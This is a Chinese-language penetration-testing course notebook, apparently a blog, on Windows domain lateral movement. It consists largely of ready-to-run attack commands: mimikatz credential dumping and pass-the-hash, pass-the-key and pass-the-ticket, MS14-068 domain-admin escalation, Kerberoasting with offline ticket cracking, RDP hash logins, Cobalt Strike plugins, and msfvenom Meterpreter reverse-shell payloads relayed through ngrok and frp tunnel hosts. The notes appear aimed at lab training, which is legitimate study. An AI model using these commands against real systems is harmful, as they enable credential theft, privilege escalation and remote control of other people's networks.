<h3 id="day68-内网安全-域横向PTH-amp-PTK-amp-PTT哈希票据传递"><a href="#day68-内网安全-域横向PTH-amp-PTK-amp-PTT哈希票据传递" class="headerlink" title="day68-内网安全-域横向PTH&amp;PTK&amp;PTT哈希票据传递"></a>day68-内网安全-域横向PTH&amp;PTK&amp;PTT哈希票据传递</h3><p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/640.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Kerberos协议具体工作方式</span><br><span class="line">	客户机讲明文密码进行NTLM哈希，然后和时间戳一起加密(使用krbtgt密码hash作为密钥)，发送给kdc(域控)，kdc对用户进行检测，成功后创建TGT(Ticket-Granting Ticket)</span><br><span class="line">	将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据</span><br><span class="line">	然后客户机将TGT发送给域控制器KDC请求TGS(票证授权服务)票证，并且对TGT进行检测</span><br><span class="line">	检测成功后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回客户机</span><br><span class="line">PTH(pass the hash) 		利用lm或者ntlm的值进行的渗透测试</span><br><span class="line">PTT(pass the ticket) 	利用的票据凭证TGT进行的渗透测试</span><br><span class="line">PTK(pass the key)		利用的ekeys aes256进行的渗透测试</span><br><span class="line"></span><br><span class="line">PTH在内网渗透中是一种经典的攻击方式，原理是攻击者可以直接通过LM Hash和NTLM Hash远程访问主机或服务 而不提供明文密码</span><br><span class="line">如果禁用了ntlm认证，Psexec无法利用获得的ntlm hash进行远程连接，但是使用mimikatz还是可以攻击成功。对于8.1/2012r2,安装补丁kb2871997的win7/2008r2/2012等，可以使用aes keys代替NT hash来实现ptk攻击</span><br><span class="line">总结：KB2871997补丁后的影响</span><br><span class="line">pth:没打补丁用户都可以连接，打了补丁只能administrator连接</span><br><span class="line">ptk:打了补丁才能用户连接，采用aes256连接		???</span><br><span class="line">	https://www.freebuf.com/column/220740.html</span><br><span class="line"></span><br><span class="line">PTT攻击的部分不是简单的NTLM认证，它利用Kerbos协议进行攻击，常见三种攻击手法MS14-068,Golden ticket,SILVER ticket 简单来说就是将连接合法的票据注入到内存中实现连接</span><br><span class="line"></span><br><span class="line">其中Golden ticket(黄金票据) SILVER ticket(白银票据)属于权限维持技术</span><br><span class="line">ms14-068造成的危害是允许域内任何一个普通用户，将自己提升至域管理权限，微软给出的补丁kb3011780</span><br><span class="line"></span><br><span class="line">传递</span><br><span class="line">	没打补丁 pth (lm ntlm)	所有用户</span><br><span class="line">	打补丁</span><br><span class="line">		pth (lm ntlm) administrator</span><br><span class="line">		ptk aes 所有用户	好像是打了补丁才能用</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	案例1-域横向移动PTH传递-mimikatz</span></span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line">        </span><br><span class="line">严谨些LM NTML最好都收集</span><br><span class="line">sekurlsa::ekeys				<span class="comment">#获取aes加密</span></span><br><span class="line">        </span><br><span class="line">PTH ntlm传递</span><br><span class="line">未打补丁得到工作组及域连接</span><br><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:...</span><br><span class="line">sekurlsa::pth /user:administrator /domain:workgroup /ntlm:...		<span class="comment">#workgroup连的是本地用户</span></span><br><span class="line">成功会弹出一个cmd窗口 此时说明god域内administrator用户可以连接了</span><br><span class="line">	<span class="built_in">dir</span> \\<span class="number">192.168</span><span class="number">.52</span><span class="number">.138</span>\c$\		<span class="comment">#红日2008r2</span></span><br><span class="line">                    </span><br><span class="line">攻击当前域控主机</span><br><span class="line">	net time /domain </span><br><span class="line">直接连接域控主机是无法连接的</span><br><span class="line">使用mimikatz进行攻击</span><br><span class="line">	sekurlsa::pth /user:administrator /domain:god /ntlm:...</span><br><span class="line">    指令没有ip是一种随机攻击，ip地址是前期信息收集的，连接时可以遍历ip地址</span><br><span class="line">    看哪个有回显</span><br><span class="line">    攻击成功反弹回来一个cmd</span><br><span class="line">    在这个cmd中进行连接</span><br><span class="line">    	net use \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span>\c$</span><br><span class="line">	如果ip不识别，就换成计算机名</span><br><span class="line">    sekurlsa::pth /user:administrator /domain:workgroup /ntlm:...</span><br><span class="line">    	此处domain是一个工作组，直接连接到了主机的本地的Administered  ??</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	案例2-域横向移动PTK传递-mimikatz</span></span><br><span class="line">PTK aes256传递</span><br><span class="line">打补丁后的工作组及域连接</span><br><span class="line">sekurlsa::ekeys		<span class="comment">#获取aes </span></span><br><span class="line">	sekurlsa::pth /user:mary /domain:god.org /aes256:...</span><br><span class="line"></span><br><span class="line">传递</span><br><span class="line">	没打补丁 pth (lm ntlm)	所有用户</span><br><span class="line">   	打了补丁</span><br><span class="line">    	pth (lm ntlm) administrator</span><br><span class="line">        ptk aes 所有用户</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::pth /user:mary /domain:god /aes256:....</span></span><br><span class="line">	弹出一个cmd窗口，尝试连接域内主机 </span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 域横向移动PTT传递-MS14068&amp;kekeo&amp;local  	类似web中伪造cookie</span></span><br><span class="line">第一种利用漏洞:</span><br><span class="line">   	能是实现普通用户直接获取域控system</span><br><span class="line"><span class="comment">#ms14-068 powershell执行</span></span><br><span class="line">	<span class="number">1.</span>查看当前sid whoami/user 		<span class="comment">#获取sid  </span></span><br><span class="line">    <span class="number">2.</span>mimikatz <span class="comment">#kerberos::purge			或者cnd中klist purge</span></span><br><span class="line">        //清空当前机器中所有凭证，如果有域成员凭证(低权限)会影响凭证伪造</span><br><span class="line">        mimikatz<span class="comment"># kerberos::list 	//查看当前机器凭证</span></span><br><span class="line">        mimikatz<span class="comment"># kerberos::ptc 票据文件 	//讲票据注入到内存中</span></span><br><span class="line">	<span class="number">3.</span>利用ms14-068生成TGT数据</span><br><span class="line">    	ms14-<span class="number">068.</span>exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码</span><br><span class="line">        ms14-<span class="number">068.</span>exe -u mary@god.org -s .... -d <span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> -p admin!@<span class="comment">#45			#生成了TGT_mary@god.org.ccache文件</span></span><br><span class="line">    <span class="number">4.</span>票据注入内存</span><br><span class="line">    	mimikatz.exe <span class="string">&quot;kerberos::ptc TGT_mary@god.org.ccache&quot;</span> exit</span><br><span class="line">    <span class="number">5.</span>查看凭证列表 klist</span><br><span class="line">   	<span class="number">6.</span>利用 <span class="built_in">dir</span> \\<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span>\C$		<span class="comment">#失败</span></span><br><span class="line">        <span class="built_in">dir</span> \\owa.god.org\c$			<span class="comment">#此处需要使用计算机名</span></span><br><span class="line"></span><br><span class="line">mimikatz.exe <span class="comment"># privilege::debug			管理员提升到system??</span></span><br><span class="line">win7命令行复制黏贴 编辑-标记-回车(黏贴)</span><br><span class="line">    </span><br><span class="line">第二种 使用工具kekeo</span><br><span class="line">    <span class="number">1.</span>生成票据</span><br><span class="line">        kekeo <span class="string">&quot;tgt::ask /user:mary /domain:god.org /ntlm:...&quot;</span></span><br><span class="line">    <span class="number">2.</span>票据导入</span><br><span class="line">        kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi</span><br><span class="line">    <span class="number">3.</span>查看凭证klist</span><br><span class="line">    <span class="number">4.</span>利用net use载入</span><br><span class="line">		<span class="built_in">dir</span> \\主机名\c$		×××××</span><br><span class="line">第三种 利用本地票据(需要管理员权限)</span><br><span class="line">	sekurlsa::ticket /export</span><br><span class="line">    kerberos::ptt xxxxx.xxx.kirbi</span><br><span class="line"><span class="comment">#总结ptt传递不需要本地管理员权限，连接主机名连接，基于漏洞，工具，本地票据 ptt票据存活时间只有10个小时</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 国产Ladon内网杀器测试验收</span></span><br><span class="line">信息收集-协议扫描-漏洞探针-传递攻击</span><br></pre></td></tr></table></figure>

<h3 id="day69-域横向-CobaltStrike-amp-SPN-amp-RDP"><a href="#day69-域横向-CobaltStrike-amp-SPN-amp-RDP" class="headerlink" title="day69-域横向 CobaltStrike&amp;SPN&amp;RDP"></a>day69-域横向 CobaltStrike&amp;SPN&amp;RDP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">域环境</span><br><span class="line">	传递</span><br><span class="line">	漏洞</span><br><span class="line">	SPN</span><br><span class="line">		流程</span><br><span class="line">			探针SPN服务 请求服务票据 导出服务票据 破解服务票据 重写服务票据</span><br><span class="line">		服务</span><br><span class="line">			MSSQL WSMAN Exchange TERMSERV Hyper-V host</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例1	域横向移动RDP传递-mimikatz</span></span><br><span class="line">	除了上述讲到的IPC，WMI，SMB等协议的连接外，获取到的明文密码或HASH密文也可以通过RDP协议进行链接操作</span><br><span class="line">    	RDP 	remote desktop protocol</span><br><span class="line">    RDP协议连接：判断对方远程桌面是否开启<span class="number">3389</span>端口</span><br><span class="line">    	自己测试 配置 计算机-属性-远程登陆</span><br><span class="line">    </span><br><span class="line">RDP明文密码连接</span><br><span class="line">    	Windows:mstsc</span><br><span class="line">            mstsc.exe /console /v:<span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span> /admin</span><br><span class="line">      	linux rdesktop <span class="number">192.168</span><span class="number">.3</span><span class="number">.21</span>:<span class="number">3389</span></span><br><span class="line"></span><br><span class="line">RDP密文HASH连接</span><br><span class="line">windows Server需要开启 Restricted Admin mode，在Windows8<span class="number">.1</span> 和Windows Server <span class="number">2012</span> R2中默认开启，同时如果win7和windows server <span class="number">2008</span> r2安装了<span class="number">2871997</span>、<span class="number">2973351</span>补丁也支持；开启命令：</span><br><span class="line">	REG ADD <span class="string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v DisableRestrictedAdmin /t REG_DWORD /d <span class="number">00000000</span> /f</span><br><span class="line">开启后运行</span><br><span class="line">mstsc.exe /restrictedadmin</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:god /ntlm:.... <span class="string">&quot;run:mstsc.exe /restrictedadmin&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例2	域横向移动SPN服务，探针，请求，破解，重写</span></span><br><span class="line">https://www.cnblogs.com/backlion/p/<span class="number">8082623.</span>html</span><br><span class="line">    SPN 服务主体名称 是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。</span><br><span class="line">    攻击者使用有效的域用户身份验证票证(TGT)去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务账户加密票证，以便服务能够验证用户是否能够访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5,这意味着服务账户的NTLM密码哈希用于加密服务票证。攻击者讲收到TGS票据离线进行破解，即可得到目标服务账号的HASH，这个称之为Kerberoast攻击。如果有一个为域用户账户注册的任意SPN。那么该用户账户的明文密码的NTLM哈希值就将用于创建服务票据。这是Kerberoast攻击的关键</span><br><span class="line"></span><br><span class="line"><span class="comment">#探针</span></span><br><span class="line">setspn -q */*</span><br><span class="line">setspn -q */* |findstr <span class="string">&quot;MSSQL&quot;</span></span><br><span class="line">请求</span><br><span class="line">	Add-<span class="type">Type</span> -AssemblyName System.IdentityModel</span><br><span class="line">    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="string">&quot;xxxx&quot;</span>			<span class="comment">#xxxx是setspn查出来完整的</span></span><br><span class="line">    或者	mimikatz.exe <span class="string">&quot;kerberos::ask /target:xxxx&quot;</span></span><br><span class="line">导出</span><br><span class="line">	mimikatz.exe <span class="string">&quot;kerberos::ask /target:xxxx&quot;</span></span><br><span class="line">    用mimikatz导出生成的票据</span><br><span class="line">破解</span><br><span class="line">	python tgsrepcrack.py passwd.txt xxxx.kirbi</span><br><span class="line">    python3 .\tgsrepcrack.py .\passwd.txt .\.....kirbi</span><br><span class="line">重写		<span class="comment">#500是administrator标识 512是管理员组标识</span></span><br><span class="line">	python kerkeoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u <span class="number">500</span></span><br><span class="line">    python kerkeoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g <span class="number">512</span></span><br><span class="line">    mimikatz.exe kerberos::ptt xxxx.kirbi		<span class="comment">#票据注入内存</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 域横向移动测试流程 一把梭哈-Cobalt Strike</span></span><br><span class="line">启动-配置-监听-执行-提权-信息收集(网络，凭证，定位)-渗透</span><br><span class="line">	<span class="number">1.</span>关于启动及配置讲解</span><br><span class="line">    <span class="number">2.</span>关于提权及插件加载</span><br><span class="line">    <span class="number">3.</span>关于信息收集命令讲解</span><br><span class="line">    <span class="number">4.</span>关于视图自动化功能讲解</span><br><span class="line">    </span><br><span class="line">右键-会话-sleep-<span class="number">1</span> 		设置每次发包的时间 默认<span class="number">60.</span>..</span><br><span class="line">脚本管理器上传插件</span><br><span class="line"></span><br><span class="line">常用命令</span><br><span class="line">	getuid</span><br><span class="line">    net view</span><br><span class="line">    net computers</span><br><span class="line">    net dclist</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># CS插件</span></span><br><span class="line">kerberoast：https://github.com/nidem/kerberoast</span><br><span class="line">taowu-cobalt-strike（插件-小迪精选）：https://github.com/pandasec888/taowu-cobalt-strike</span><br><span class="line">Cobalt Strike <span class="number">4.0</span>手册：https://pan.baidu.com/s/15DCt2Rzg5cZjXnEuUTgQ9Q 提取码：dtm2</span><br><span class="line">红队实战演练环境：https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug 提取码：taqu</span><br><span class="line">Erebus（插件-小迪使用）：https://github.com/DeEpinGh0st/Erebus</span><br><span class="line">（Cobalt Strike插件）：https://github.com/rsmudge/Elevatekit</span><br><span class="line">（Cobalt Strike插件）：https://github.com/harleyQu1nn/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/bluscreenofjeff/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/michalkoczwara/aggressor_scripts_collection</span><br><span class="line">（Cobalt Strike插件）：https://github.com/vysecurity/Aggressor-VYSEC</span><br><span class="line">（Cobalt Strike插件）：https://github.com/killswitch-GUI/CobaltStrike-ToolKit</span><br><span class="line">（Cobalt Strike插件）：https://github.com/ramen0x3f/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/FortyNorthSecurity/AggressorAssessor</span><br><span class="line">（Cobalt Strike插件）：https://github.com/threatexpress/persistence-aggressor-script</span><br><span class="line">（Cobalt Strike插件）：https://github.com/threatexpress/aggressor-scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/branthale/CobaltStrikeCNA</span><br><span class="line">（Cobalt Strike插件）：https://github.com/gaudard/scripts/tree/master/red-team/aggressor</span><br><span class="line">（Cobalt Strike插件）：https://github.com/001SPARTaN/aggressor_scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/Und3rf10w/Aggressor-scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/rasta-mouse/Aggressor-Script</span><br><span class="line">（Cobalt Strike插件）：https://github.com/vysec/Aggressor-VYSEC</span><br><span class="line">（Cobalt Strike插件）：https://github.com/threatexpress/aggressor-scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/threatexpress/red-team-scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/vysecurity/CVE-<span class="number">2018</span>-<span class="number">4878</span></span><br><span class="line">（Cobalt Strike插件）：https://github.com/harleyQu1nn/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/bluscreenofjeff/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/QAX-A-Team/CobaltStrike-Toolset</span><br><span class="line">（Cobalt Strike插件）：https://github.com/ars3n11/Aggressor-Scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/michalkoczwara/aggressor_scripts_collection</span><br><span class="line">（Cobalt Strike插件）：https://github.com/killswitch-GUI/CobaltStrike-Toolkit</span><br><span class="line">（Cobalt Strike插件）：https://github.com/ZonkSec/persistence-aggressor-script</span><br><span class="line">（Cobalt Strike插件）：https://github.com/rasta-mouse/Aggressor-Script</span><br><span class="line">（Cobalt Strike插件）：https://github.com/RhinoSecurityLabs/Aggressor-Scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/Kevin-Robertson/Inveigh</span><br><span class="line">（Cobalt Strike插件）：https://github.com/Genetic-Malware/Ebowla</span><br><span class="line">（Cobalt Strike插件）：https://github.com/001SPARTaN/aggressor_scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/gaudard/scripts/tree/master/red-team/aggressor</span><br><span class="line">（Cobalt Strike插件）：https://github.com/branthale/CobaltStrikeCNA</span><br><span class="line">（Cobalt Strike插件）：https://github.com/oldb00t/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/p292/Phant0m_cobaltstrike</span><br><span class="line">（Cobalt Strike插件）：https://github.com/p292/DDEAutoCS</span><br><span class="line">（Cobalt Strike插件）：https://github.com/secgroundzero/CS-Aggressor-Scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/skyleronken/Aggressor-Scripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/tevora-threat/aggressor-powerview</span><br><span class="line">（Cobalt Strike插件）：https://github.com/tevora-threat/PowerView3-Aggressor</span><br><span class="line">（Cobalt Strike插件）：https://github.com/threatexpress/persistence-aggressor-script</span><br><span class="line">（Cobalt Strike插件）：https://github.com/FortyNorthSecurity/AggressorAssessor</span><br><span class="line">（Cobalt Strike插件）：https://github.com/mdsecactivebreach/CACTUSTORCH</span><br><span class="line">（Cobalt Strike插件）：https://github.com/C0axx/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/offsecginger/AggressorScripts</span><br><span class="line">（Cobalt Strike插件）：https://github.com/tomsteele/cs-magik</span><br><span class="line">（Cobalt Strike插件）：https://github.com/bitsadmin/nopowershell</span><br><span class="line">（Cobalt Strike插件）：https://github.com/SpiderLabs/SharpCompile</span><br></pre></td></tr></table></figure>



<h3 id="day70-域横向内网漫游Socks代理隧道技术"><a href="#day70-域横向内网漫游Socks代理隧道技术" class="headerlink" title="day70 域横向内网漫游Socks代理隧道技术"></a>day70 域横向内网漫游Socks代理隧道技术</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">必要基础知识点</span><br><span class="line">	<span class="number">1.</span>内外网简单知识</span><br><span class="line">	<span class="number">2.</span>内网<span class="number">1</span>和内网<span class="number">2</span>通信问题</span><br><span class="line">		可以用代理解决</span><br><span class="line">	<span class="number">3.</span>正向反向协议通信连接问题</span><br><span class="line">		正向:指正方向连接，控制端连接被控制端</span><br><span class="line">		反向:...</span><br><span class="line">			假如控制端是公网，被控是内网，可以让被控端去找控制端</span><br><span class="line">	<span class="number">4.</span>内网穿透代理隧道技术说明</span><br><span class="line">		隧道主要是解决流量分析工具，流量监控工具，防火墙相关过滤</span><br><span class="line">		代理主要解决网络连通性问题</span><br><span class="line"></span><br><span class="line">代理工具</span><br><span class="line">	frp ngrok reGeorg sockscap64 earthworm proxifier proxychains</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例1	内网穿透Ngrok测试演示-两个内网通讯上线		现在需要实名</span></span><br><span class="line"><span class="number">1.</span>注册-购买-填写-确认http://www.ngrok.cc/</span><br><span class="line">	协议:http 本地端口<span class="number">192.168</span><span class="number">.76</span><span class="number">.132</span>:<span class="number">4444</span></span><br><span class="line"><span class="number">2.</span>测试：内网<span class="number">1</span>执行后门-免费主机处理-内网<span class="number">2</span>监听-内网<span class="number">2</span>接收器(攻击机)</span><br><span class="line">	sunny为下载的客户端 区分win和linux 在官网</span><br><span class="line">	./sunny clientid <span class="built_in">id</span>		<span class="comment">#id在网站隧道管理那里</span></span><br><span class="line">    msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=<span class="number">80</span> -f exe -o test.exe		<span class="comment">#80是因为http走80	xiaodisec.free.idcfengye.com开通后给的</span></span><br><span class="line">    use exploit/multi/handler</span><br><span class="line">    <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">    <span class="built_in">set</span> lhost <span class="number">192.168</span><span class="number">.76</span><span class="number">.132</span></span><br><span class="line">    <span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line">    exploit</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例2	frp自建跳板测试 两个内网通讯上线</span></span><br><span class="line">自行搭建，方便修改，成本低，使用多样化</span><br><span class="line"><span class="number">1.</span>服务端-下载-解压-修改-启动	(阿里云主机须修改安全组配置出入口)</span><br><span class="line">服务器修改配置文件frps.ini</span><br><span class="line">	[common]</span><br><span class="line">	bind_port = <span class="number">6677</span></span><br><span class="line">./frps -c ./frps.ini		<span class="comment">#启动服务端</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>控制端-下载-解压-修改-启动</span><br><span class="line">	[common]</span><br><span class="line">    server_addr=云主机ip</span><br><span class="line">    server_port=<span class="number">6677</span>		<span class="comment">#同上</span></span><br><span class="line">    [msf]</span><br><span class="line">    <span class="built_in">type</span> = tcp</span><br><span class="line">    local_ip = <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    local_port = <span class="number">5555</span></span><br><span class="line">    remote_port=<span class="number">6000</span>		<span class="comment">#	服务端该端口须开启防火墙</span></span><br><span class="line">./frpc -c ./frpc.ini	<span class="comment">#开启客户端</span></span><br><span class="line"></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=公网ip lport=<span class="number">6000</span> -f exe -o frp.exe</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">5555</span></span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">靶机运行frp</span><br></pre></td></tr></table></figure>

